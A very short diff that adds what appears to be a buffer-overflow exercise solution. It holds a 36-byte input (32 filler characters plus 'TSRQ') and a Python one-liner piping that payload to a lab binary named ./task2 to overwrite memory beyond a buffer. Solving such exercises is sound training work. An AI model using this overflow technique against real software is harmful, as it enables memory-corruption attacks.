@@ -1,0 +1,3 @@
+qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqTSRQ
+
+python -c 'this = "A"*32 + "TSRQ";print(this)' | xargs ./task2
